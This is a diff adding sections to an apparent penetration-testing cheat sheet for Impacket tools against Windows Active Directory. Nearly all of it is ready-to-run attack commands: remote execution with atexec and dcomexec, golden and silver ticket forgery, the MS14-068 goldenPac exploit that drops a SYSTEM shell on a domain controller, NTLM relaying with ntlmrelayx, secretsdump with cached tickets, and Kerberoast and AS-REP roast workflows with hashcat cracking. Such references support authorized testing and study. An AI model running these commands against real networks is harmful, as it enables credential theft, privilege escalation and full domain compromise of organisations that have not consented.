@@ -124,6 +124,123 @@ impacket-mssqlclient 'DOMAIN/user:pass@<IP>' -windows-auth
 # then:  enable_xp_cmdshell  ;  xp_cmdshell whoami
 ```
 
+### atexec / dcomexec — alternate remote exec
+
+Same idea as psexec but different mechanism — useful when Defender blocks psexec or port 445 is the only reliable vector.
+
+```bash
+# atexec — schedules a task, runs command, fetches output
+impacket-atexec 'DOMAIN/Administrator:pass@<IP>' 'whoami /all'
+impacket-atexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/Administrator@<IP>' 'ipconfig'
+
+# dcomexec — DCOM-based (MMC20.Application, ShellWindows, ShellBrowserWindow)
+impacket-dcomexec 'DOMAIN/Administrator:pass@<IP>' 'whoami'
+impacket-dcomexec -object MMC20 'DOMAIN/user:pass@<IP>'
+```
+
+### ticketer — forge golden / silver tickets
+
+Once you have the krbtgt NT hash (via DCSync) you can mint any ticket.
+
+```bash
+# Golden ticket (domain-wide)
+impacket-ticketer -nthash <krbtgt_nt_hash> -domain-sid S-1-5-21-... \
+  -domain corp.local Administrator
+# Produces Administrator.ccache — use it:
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
+
+# Silver ticket (one service, e.g. CIFS on a specific host) — needs service account NT hash
+impacket-ticketer -nthash <svc_nt_hash> -domain-sid S-1-5-21-... \
+  -domain corp.local -spn cifs/fileserver.corp.local Administrator
+```
+
+### goldenPac.py — MS14-068 one-shot
+
+Legacy but still tested:
+```bash
+impacket-goldenPac 'corp.local/lowpriv:pass@dc01.corp.local'
+# Auto-exploits MS14-068, drops a SYSTEM shell on the DC via psexec
+```
+
+### rpcdump / samrdump — info enumeration
+
+```bash
+impacket-rpcdump @<IP>                       # anonymous RPC endpoint dump
+impacket-samrdump 'DOMAIN/user:pass@<IP>'    # SAMR user enumeration
+```
+
+### getArch.py — fast MSRPC arch fingerprint
+
+```bash
+impacket-getArch -target <IP>
+# Prints x86 vs x64 via MSRPC — useful before choosing payload arch
+```
+
+### ntlmrelayx — relay captured auth
+
+Chain with [responder](responder.md) (SMB+HTTP off in Responder.conf):
+```bash
+# Targets file: list of SMB hosts with SMB signing OFF
+impacket-ntlmrelayx -smb2support -tf targets.txt -c 'whoami'
+
+# Relay to LDAP (add computer account)
+impacket-ntlmrelayx -t ldap://dc01.corp.local --add-computer attacker
+
+# Socks mode — dynamic SOCKS4 proxy per relayed session
+impacket-ntlmrelayx -tf targets.txt -socks
+# then: proxychains crackmapexec smb <victim> -u <relayed_user> -p ''
+```
+
+---
+
+## 🎟 `-k -no-pass` — use cached Kerberos ticket
+
+When you've already obtained a TGT (from `getTGT.py`, `ticketer.py`, mimikatz, or Rubeus) and exported it to a ccache:
+
+```bash
+# Get a TGT using password or NT hash
+impacket-getTGT 'corp.local/alice:Pass123'
+# → alice.ccache
+
+# Export and use ANY impacket script with -k -no-pass
+export KRB5CCNAME=$(pwd)/alice.ccache
+impacket-psexec -k -no-pass corp.local/alice@dc01.corp.local
+impacket-secretsdump -k -no-pass corp.local/alice@dc01.corp.local
+impacket-wmiexec -k -no-pass corp.local/alice@dc01.corp.local
+```
+
+**Critical:** target must be an **FQDN**, not IP, and `/etc/hosts` or DNS must resolve it. Kerberos uses hostnames in SPNs.
+
+---
+
+## 🎯 Full Kerberoast / AS-REP workflows
+
+### Kerberoast (authenticated)
+```bash
+# 1. Request TGS for every SPN the user can see
+impacket-GetUserSPNs -request -dc-ip <DC_IP> \
+  corp.local/alice:Pass123 -outputfile tgs.hash
+
+# 2. Crack
+hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -O
+
+# 3. Show results
+hashcat -m 13100 tgs.hash --show
+```
+
+### AS-REP Roast (no auth needed)
+```bash
+# 1. Enumerate users (kerbrute or BloodHound) → users.txt
+
+# 2. Request AS-REP for users with DONT_REQ_PREAUTH
+impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass \
+  -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash
+
+# 3. Crack
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+```
+
 ---
 
 ## ⚠️ Gotchas
